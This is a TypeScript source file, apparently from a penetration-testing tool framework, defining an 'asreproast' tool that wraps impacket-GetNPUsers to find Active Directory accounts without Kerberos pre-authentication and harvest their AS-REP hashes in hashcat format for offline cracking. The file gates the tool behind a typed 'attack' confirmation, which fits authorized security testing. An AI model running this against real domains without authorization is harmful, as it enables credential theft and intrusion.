/**
 * v0.4-B — `asreproast` tool. Wraps `impacket-GetNPUsers` to
 * enumerate accounts that don't require Kerberos pre-authentication
 * (UF_DONT_REQUIRE_PREAUTH set) and request AS-REP tickets for them
 * in hashcat-format. Pre-auth — no credentials needed for the
 * enumeration step itself (impacket will fall back to anonymous
 * bind; modern DCs reject this and the run fails with a clear error).
 *
 * Chokepoint contract: same as `psexec` (see `./psexec.ts`).
 *
 * Output: stdout contains `$krb5asrep$23$user@realm:hash$hash` lines,
 * one per vulnerable account.
 */

import { z } from 'zod';
import { run } from '../shared/runner.js';
import type { Tool, ToolContext } from '@gmft/core';
import {
  AdInputBase,
  AdOutputBase,
  AD_IMAGE,
  buildImpacketTarget,
  defaultAdFindings,
} from './shared.js';

export const AsreproastInput = AdInputBase.merge(
  z.object({
    /** Output format. Default `hashcat` for offline cracking. */
    format: z.enum(['hashcat', 'john']).optional(),
    /** When true, request AS-REP for all vulnerable accounts
     *  (impacket default). Default true. */
    request: z.boolean().optional(),
  }),
);
export type AsreproastInputT = z.infer<typeof AsreproastInput>;

export const AsreproastOutput = AdOutputBase;
export type AsreproastOutputT = z.infer<typeof AsreproastOutput>;

/**
 * Parse one or more `$krb5asrep$...` hashcat-format lines from
 * impacket-GetNPUsers output. Returns one line per vulnerable
 * account.
 */
const ASREP_LINE = /\$krb5asrep\$\d+\$[^\s]+/g;

export function parseAsrepHashes(stdout: string): string[] {
  return stdout.match(ASREP_LINE) ?? [];
}

export function buildAsreproastArgs(input: AsreproastInputT): string[] {
  const target = buildImpacketTarget(input);
  const argv = ['impacket-GetNPUsers'];
  if (input.request !== false) argv.push('-request');
  if (input.format && input.format !== 'hashcat') argv.push('-format', input.format);
  argv.push(target);
  return argv;
}

export const asreproastTool: Tool<
  typeof AsreproastInput,
  typeof AsreproastOutput
> = {
  name: 'asreproast',
  category: 'ad',
  flags: ['destructive', 'targetRequired'],
  typeToConfirm: 'attack',
  description:
    'Enumerate accounts without Kerberos pre-auth via impacket-GetNPUsers. ' +
    'Output is hashcat-format AS-REP hashes ready for offline cracking.',
  input: AsreproastInput,
  output: AsreproastOutput,
  async run(
    input: AsreproastInputT,
    _ctx: ToolContext,
  ): Promise<AsreproastOutputT> {
    const parsed = AsreproastInput.parse(input);
    const argv = buildAsreproastArgs(parsed);
    const r = await run({ argv, image: AD_IMAGE, timeoutMs: 120_000 });
    return {
      stdout: r.stdout,
      stderr: r.stderr,
      exitCode: r.exitCode,
      durationMs: r.durationMs,
      mode: r.mode,
      fellBack: r.fellBack,
      findings: [...defaultAdFindings(r.stdout), ...parseAsrepHashes(r.stdout)],
    };
  },
};
